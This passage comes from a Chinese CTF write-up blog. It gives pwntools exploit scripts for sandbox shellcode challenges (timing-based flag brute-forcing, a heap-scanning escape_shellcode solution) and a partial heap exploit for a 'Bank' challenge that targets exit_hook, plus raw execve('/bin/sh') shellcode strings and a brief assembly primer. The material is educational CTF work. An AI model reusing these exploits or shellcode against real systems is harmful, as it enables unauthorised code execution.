class="hljs-comment"># pause()</span><br>        <br>        start = time.time()<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># sh.recv()# 收取垃圾数据</span><br>            sh.recv(timeout = <span class="hljs-number">2</span>)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br>        end = time.time()<br>        <br>        <span class="hljs-keyword">if</span> end - start &gt; <span class="hljs-number">1.5</span>:<br>            ans = ans + <span class="hljs-built_in">chr</span>(ch)<br>            success(<span class="hljs-string">&quot;\033[0;32mflag:&#123;0&#125;\033[0m&quot;</span>.<span class="hljs-built_in">format</span>(ans))<br>            sh.close()<br>            sleep(<span class="hljs-number">3</span>)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>需要注意的是，如果我们<code>open</code>的文件过多，系统会发生错误：<code>OSError: [Errno 24] Too many open files</code>，所以我们每次爆破的flag的字节数有限制，需要对索引进行调整，这也是这个脚本的缺陷所在。</p><h3 id="WP-again-1"><a href="#WP-again-1" class="headerlink" title="WP_again"></a>WP_again</h3><blockquote><p>学长的自动化脚本，膜拜一下</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># context.log_level = &quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dynamite_xor</span>(<span class="hljs-params">io,idx,char</span>):<br>    shellcode = shellcraft.amd64.pushstr(<span class="hljs-string">&quot;flag&quot;</span>)<br>    shellcode += shellcraft.amd64.linux.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br>    shellcode += shellcraft.amd64.linux.read(<span class="hljs-string">&#x27;rax&#x27;</span>,<span class="hljs-string">&#x27;rsp&#x27;</span>,idx+<span class="hljs-number">1</span>)<br>    shellcode += <span class="hljs-string">&quot;mov al,[rsp+&#123;0&#125;];xor rax,&#123;1&#125;;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(idx),<span class="hljs-built_in">str</span>(char))<br>    shellcode += shellcraft.amd64.linux.read(<span class="hljs-string">&#x27;rax&#x27;</span>,<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-number">1</span>)<br>    payload = asm(shellcode)<br>    io.recvuntil(<span class="hljs-string">&#x27;Welcome to silent execution-box.&#x27;</span>)<br>    info(<span class="hljs-string">&quot;\033[0;34mmov al,[rsp+&#123;0&#125;]; xor rax, &#123;1&#125;;\033[0m&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(idx),<span class="hljs-built_in">chr</span>(char)))<br>    io.sendline(payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dynamite_sub</span>(<span class="hljs-params">io,idx,char</span>):<br>    shellcode = shellcraft.amd64.pushstr(<span class="hljs-string">&quot;flag&quot;</span>)<br>    shellcode += shellcraft.amd64.linux.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br>    shellcode += shellcraft.amd64.linux.read(<span class="hljs-string">&#x27;rax&#x27;</span>,<span class="hljs-string">&#x27;rsp&#x27;</span>,idx+<span class="hljs-number">1</span>)<br>    shellcode += <span class="hljs-string">&quot;mov al,[rsp+&#123;0&#125;];sub rax,&#123;1&#125;;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(idx),<span class="hljs-built_in">str</span>(char))<br>    shellcode += shellcraft.amd64.linux.read(<span class="hljs-string">&#x27;rax&#x27;</span>,<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-number">1</span>)<br>    payload = asm(shellcode)<br>    io.recvuntil(<span class="hljs-string">&#x27;Welcome to silent execution-box.&#x27;</span>)<br>    info(<span class="hljs-string">&quot;\033[0;34mmov al,[rsp+&#123;0&#125;];sub rax,&#123;1&#125;;\033[0m&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(idx),<span class="hljs-built_in">chr</span>(char)))<br>    io.sendline(payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dynamite_add</span>(<span class="hljs-params">io,idx,char</span>):<br>    shellcode = shellcraft.amd64.pushstr(<span class="hljs-string">&quot;flag&quot;</span>)<br>    shellcode += shellcraft.amd64.linux.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br>    shellcode += shellcraft.amd64.linux.read(<span class="hljs-string">&#x27;rax&#x27;</span>,<span class="hljs-string">&#x27;rsp&#x27;</span>,idx+<span class="hljs-number">1</span>)<br>    shellcode += <span class="hljs-string">&quot;mov al,[rsp+&#123;0&#125;];sub rax,&#123;1&#125;;add rax, 2&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(idx),<span class="hljs-built_in">str</span>(char))<br>    shellcode += shellcraft.amd64.linux.read(<span class="hljs-string">&#x27;rax&#x27;</span>,<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-number">1</span>)<br>    payload = asm(shellcode)<br>    io.recvuntil(<span class="hljs-string">&#x27;Welcome to silent execution-box.&#x27;</span>)<br>    info(<span class="hljs-string">&quot;\033[0;33mmov al,[rsp+&#123;0&#125;];sub rax,&#123;1&#125;;add rax, 2;\033[0m&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(idx),<span class="hljs-built_in">chr</span>(char)))<br>    io.sendline(payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_time</span>(<span class="hljs-params">io</span>):<br>    start_time = time.time()<br>    <span class="hljs-keyword">try</span>:<br>        io.recv()<br>        io.recv(timeout=<span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">if</span> time.time() - start_time &gt;= <span class="hljs-number">1.5</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">io,idx,char</span>):<br>    dynamite_sub(io,idx,char)      <br>    <span class="hljs-keyword">if</span> check_time(io):<br>      io1 = process(<span class="hljs-string">&#x27;./silent&#x27;</span>)<br>      dynamite_add(io1,idx,char)<br>      <span class="hljs-keyword">if</span> check_time(io1):<br>        io1.close()<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    flag = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">18</span>):<br>      <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>        io = process(<span class="hljs-string">&#x27;./silent&#x27;</span>)<br>        <span class="hljs-keyword">if</span> check(io,idx,char):<br>          flag += <span class="hljs-built_in">chr</span>(char)<br>          success(<span class="hljs-string">&quot;\033[0;32mflag[&#123;0&#125;]:&#123;1&#125;\033[0m&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(idx),<span class="hljs-built_in">chr</span>(char)))<br>          success(<span class="hljs-string">&quot;\033[0;32mflag:&#123;0&#125;\033[0m&quot;</span>.<span class="hljs-built_in">format</span>(flag))<br>          <span class="hljs-keyword">break</span><br>        io.close()<br>    <span class="hljs-built_in">print</span>(flag)<br><br>main()<br></code></pre></td></tr></table></figure><h2 id="恶补一下汇编-判断与跳转"><a href="#恶补一下汇编-判断与跳转" class="headerlink" title="恶补一下汇编(判断与跳转)"></a>恶补一下汇编(判断与跳转)</h2><h3 id="判断指令"><a href="#判断指令" class="headerlink" title="判断指令"></a>判断指令</h3><p><code>cmp</code>指令：<code>cmp &lt;arg1&gt; : &lt;arg2&gt;</code></p><p>计算<code>&lt;arg1&gt; - &lt;arg2&gt;</code>的结果但是不保存，仅仅对标志位进行设置，有以下几种情况：</p><ul><li><code>arg1 = arg2</code>：<code>zf = 1</code></li><li><code>arg1 != arg2</code>：<code>zf = 0</code></li><li><code>arg1 &gt;= arg2</code>：<code>cf = 0</code></li><li><code>arg1 &gt; arg2</code>：<code>cf = 0</code>且<code>zf = 0</code></li><li><code>arg1 &lt;= arg2</code>：<code>cf = 1</code>且<code>zf = 1</code></li></ul><h3 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h3><ol><li>基于特定的标志位<ul><li><code>jz</code>：为零跳转，<code>zf = 1</code></li><li><code>jnz</code>：非零跳转，<code>zf = 0</code></li><li><code>jc</code>：进位跳转，<code>cf = 1</code></li><li><code>jnc</code>：无进位跳转，<code>cf = 0</code></li></ul></li><li>基于相等性的跳转<ul><li><code>je</code>：相等跳转，<code>zf = 1</code></li><li><code>jne</code>：不相等跳转，<code>zf = 0</code></li></ul></li><li>基于无符号数比较的跳转<ul><li><code>ja</code>：大于跳转，<code>cf = 0</code>且<code>zf = 0</code></li><li><code>jna</code>：不大于跳转，<code>cf = 1</code>且<code>zf = 1</code></li><li><code>jb</code>：小于跳转，<code>cf = 1</code></li><li><code>jnb</code>：不小于跳转，<code>cf = 0</code></li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>Pwn：从入门到入坟</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sandbox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022 蓝帽杯 初赛</title>
    <link href="/2022/07/10/CTF_competition/2022lm/"/>
    <url>/2022/07/10/CTF_competition/2022lm/</url>
    
    <content type="html"><![CDATA[<h2 id="escape-shellcode"><a href="#escape-shellcode" class="headerlink" title="escape_shellcode"></a>escape_shellcode</h2><p>一道开启沙盒的shellcode题目，只允许我们用read和write，恶心的是居然把除了rip寄存器之外的所有寄存器都给覆盖成垃圾数据，导致我们不能泄露地址，也不能使用栈结构，最多能搜刮是rip里面存储的堆地址。所以我们采取爆破的方式来找flag，我们flag的低位保持0x120不变，所以只要往高位爆破就好。</p><p>注意几点：一个是我们会发现每次rip中的地址和堆起始地址的偏移不一样，所以要用位运算来解决，不能用sub汇编来解决求取堆起始地址的问题；第二是我们不能在汇编之外进行循环，要在汇编里面完成循环，否则地址随机化会导致爆破不成功；第三是注意rip不可访问的问题。</p><p>WP如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&quot;./escape_shellcode&quot;</span>)<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br>pld = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">lea r13, [rip]</span><br><span class="hljs-string">mov r11, 0xfffffffff000</span><br><span class="hljs-string">and r13, r11// 求得堆地址</span><br><span class="hljs-string">add r13, 0x120// 使低位为0x120</span><br><span class="hljs-string">mov r10, r13</span><br><span class="hljs-string">mov r14, 0// r14是每次起始地址减去的长度</span><br><span class="hljs-string">mov r15, 0x10000// r15是循环的次数</span><br><span class="hljs-string">loop :</span><br><span class="hljs-string">mov r13, r10</span><br><span class="hljs-string">mov rdi, 1</span><br><span class="hljs-string">mov rdx, 0x30</span><br><span class="hljs-string">mov rax, 1</span><br><span class="hljs-string">sub r15, 1</span><br><span class="hljs-string">add r14, 0x1000// 进行0x1000大小的递增</span><br><span class="hljs-string">sub r13, r14</span><br><span class="hljs-string">mov rsi, r13</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">cmp r15, 0</span><br><span class="hljs-string">ja loop// r15大于0的时候进行跳转</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>pld = asm(pld)<br><span class="hljs-comment"># gdb.attach(sh)</span><br>sh.send(pld)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><p>只要爆破1秒就能出flag。</p><p>其他方法：如果给了libc版本，可以通过释放堆的fd泄露libc，通过libc里面的environ泄露栈，通过栈可以泄露代码段的地址，也就能得到flag的地址。</p><h2 id="Bank"><a href="#Bank" class="headerlink" title="Bank"></a>Bank</h2><p>类似于银行ATM取款机的一道题目，主要的难点在代码审计，libc版本是2.31，发现漏洞主要存在于Transfer这一个功能中，我们开始可以利用的钱是0x190(有个强制类型转换)，也就是400块，Transfer中的主要实现如下：</p><blockquote><p>注意在Transfer中可以进行刷钱，只要我们输入的金额和我们现有的金额相同就好，比赛时候就是没想通这一点，没钱💴用是真的难受😫！！！这道题就叫：用多少取多少😁</p></blockquote><ul><li>admin：花大于30块钱，可以得到一个泄露地址的机会</li><li>hacker：花大于50块钱，可以得到一个释放随机地址堆块的机会</li><li>guest：花大于5块钱，可以<code>malloc(0x18)</code>，然后写入0x10字节大小的数据</li><li>ghost：花大于10块钱，realloc一个大小小于等于0x100的堆块</li><li>abyss：无需花钱，进行任意地址写，然后<code>exit(0)</code></li></ul><p>所以我们准备打<code>exit_hook</code>，泄露libc然后找到<code>_rtld_global</code>结构体，覆盖<code>__rtld_lock_unlock_recursive</code>或者<code>_rtld_lock_lock_recursive</code>为onegadget。</p><p>exit函数调用流程：<code>exit()-&gt;__run_exit_handlers-&gt;_dl_fini-&gt;__rtld_lock_unlock_recursive or _rtld_lock_lock_recursive</code></p><blockquote><p>参考文章：<a href="https://blog.csdn.net/qq_43116977/article/details/105485947">(9条消息) exit_hook劫持_starssgo的博客-CSDN博客</a></p></blockquote><p>介绍一下realloc函数的用法，之前没遇到过：</p><p><code>void *realloc(void *ptr, size_t size)</code>：其中ptr是指向一个要重新分配的堆块，如果ptr为空，那么会分配一个新的内存块，并且函数返回一个指向它的指针；size是新的内存块的大小，如果为0并且ptr指向一个已经存在的堆块，那么ptr指向的内存块会被释放，并且返回一个空指针。需要注意的是，如果申请的大小大于原来堆块的大小，realloc会将之前的chunk释放掉，再去处理我们请求的堆块；如果申请的大小小于堆块的大小，realloc会对原有的chunk进行切分，将多余的给释放掉。在这道题目中，可以通过<strong>先realloc一个大的再realloc一个小的</strong>达到效果。</p><p>WP如下：</p><blockquote><p>用的不是题目给的libc-2.31，用的是本机的libc-2.31，所以偏移可能有差别</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding = utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br><br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br>local = <span class="hljs-number">2</span><br><span class="hljs-keyword">if</span> local == <span class="hljs-number">1</span> :<br>sh = process([<span class="hljs-string">b&quot;./ld.so&quot;</span>, <span class="hljs-string">b&quot;./pwn&quot;</span>], env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : <span class="hljs-string">b&quot;./libc.so.6&quot;</span>&#125;)<br><span class="hljs-keyword">elif</span> local == <span class="hljs-number">2</span> :<br>    sh = process(<span class="hljs-string">&quot;./Bank&quot;</span>)<br><span class="hljs-keyword">else</span> :<br>sh = remote(ip, port)<br><br>elf = ELF(<span class="hljs-string">&#x27;./Bank&#x27;</span>)<br><span class="hljs-comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span><br>libc = elf.libc<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():<br>    gdb.attach(sh)<br>    pause()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">slibc</span>(<span class="hljs-params">leak_name, leak_addr, flag = <span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">if</span> flag == <span class="hljs-number">0</span> :<br>        libc_base = leak_addr - libc.symbols[<span class="hljs-built_in">str</span>(leak_name)]<br>        sys_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>        bin_sh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br><br>    <span class="hljs-keyword">else</span> :<br>        libcsch = LibcSearcher(<span class="hljs-built_in">str</span>(leak_name), leak_addr)<br>        libc_base = leak_addr - libcsch.dump(<span class="hljs-built_in">str</span>(leak_name))<br>        sys_addr = libc_base + libcsch.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>        bin_sh = libc_base + libcsch.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> [sys_addr, bin_sh]<br><br>s       = <span class="hljs-keyword">lambda</span> data               :sh.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> text, data         :sh.sendafter(text, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :sh.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> text, data         :sh.sendlineafter(text, data)<br>r       = <span class="hljs-keyword">lambda</span> num                :sh.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> text               :sh.recvuntil(text)<br>uu32    = <span class="hljs-keyword">lambda</span>                    :u32(sh.recvuntil(<span class="hljs-string">&quot;\xf7&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span>                    :u64(sh.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg      = <span class="hljs-keyword">lambda</span> s                  :sh.success(<span class="hljs-string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br><br>sh_x86_18=<span class="hljs-string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br>sh_x86_20=<span class="hljs-string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br>sh_x64_21=<span class="hljs-string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span><br><span class="hljs-comment">#https://www.exploit-db.com/shellcodes</span><br><br><span class="hljs-comment">#------------------------------------------------------------------------------------------------------#</span><br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [r15] == NULL || r15 == NULL</span><br><span class="hljs-string">  [r12] == NULL || r12 == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [r15] == NULL || r15 == NULL</span><br><span class="hljs-string">  [rdx] == NULL || rdx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsi] == NULL || rsi == NULL</span><br><span class="hljs-string">  [rdx] == NULL || rdx == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Login</span>(<span class="hljs-params">card_number, password</span>):<br>    sla(<span class="hljs-string">b&#x27;Click: &#x27;</span>, <span class="hljs-string">b&#x27;Login&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;Card Numbers: &#x27;</span>, <span class="hljs-built_in">str</span>(card_number))<br>    sla(<span class="hljs-string">b&#x27;Password: &#x27;</span>, <span class="hljs-built_in">str</span>(password))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Info</span>():<br>    sla(<span class="hljs-string">b&#x27;Click: &#x27;</span>, <span class="hljs-string">b&#x27;Info&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Deposit</span>(<span class="hljs-params">money</span>):<br>    sla(<span class="hljs-string">b&#x27;Click: &#x27;</span>, <span class="hljs-string">b&#x27;Deposit&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;How Much? &#x27;</span>, <span class="hljs-built_in">str</span>(money))   <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Transfer</span>(<span class="hljs-params">money, name</span>):<br>    sla(<span class="hljs-string">b&#x27;Click: &#x27;</span>, <span class="hljs-string">b&#x27;Transfer&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;who? &#x27;</span>, name)<br>    sla(<span class="hljs-string">b&#x27;How much? &#x27;</span>, <span class="hljs-built_in">str</span>(money))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Put</span>(<span class="hljs-params">money</span>):<br>    sla(<span class="hljs-string">b&#x27;Click: &#x27;</span>, <span class="hljs-string">b&#x27;Put&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;How Much? &#x27;</span>, <span class="hljs-built_in">str</span>(money))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin</span>(<span class="hljs-params">money</span>):           <span class="hljs-comment"># 30</span><br>    Transfer(money, <span class="hljs-string">b&#x27;admin&#x27;</span>)    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hacker</span>(<span class="hljs-params">money, ptr</span>):     <span class="hljs-comment"># 50</span><br>    Transfer(money, <span class="hljs-string">b&#x27;hacker&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;hacker: Great!&#x27;</span>, <span class="hljs-built_in">str</span>(ptr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">guest</span>(<span class="hljs-params">money, context</span>):  <span class="hljs-comment"># 5</span><br>    Transfer(money, <span class="hljs-string">b&#x27;guest&#x27;</span>)<br>    sa(<span class="hljs-string">b&#x27;data: &#x27;</span>, context)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ghost</span>(<span class="hljs-params">money, size</span>):     <span class="hljs-comment"># 10</span><br>    Transfer(money, <span class="hljs-string">b&#x27;ghost&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;ghost: &amp;^%$#@!   :)&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">abyss</span>(<span class="hljs-params">money, addr</span>):<br>    Transfer(money, <span class="hljs-string">b&#x27;abyss&#x27;</span>)<br>    <span class="hljs-comment"># dbg()</span><br>    sl(<span class="hljs-built_in">str</span>(addr))<br><br>Login(<span class="hljs-number">11</span>, <span class="hljs-number">11111111</span>)<br><br><span class="hljs-comment"># leak heap</span><br>Put(<span class="hljs-number">11</span>)<br>ghost(<span class="hljs-number">11</span>, <span class="hljs-number">0x100</span>)<br>ghost(<span class="hljs-number">11</span>, <span class="hljs-number">0x28</span>)      <span class="hljs-comment"># use realloc to free</span><br>ghost(<span class="hljs-number">11</span>, <span class="hljs-number">0x100</span>)<br>ghost(<span class="hljs-number">11</span>, <span class="hljs-number">0x28</span>)      <span class="hljs-comment"># use realloc to free</span><br>Put(<span class="hljs-number">33</span>)       <span class="hljs-comment"># 44 - 11 = 33</span><br>admin(<span 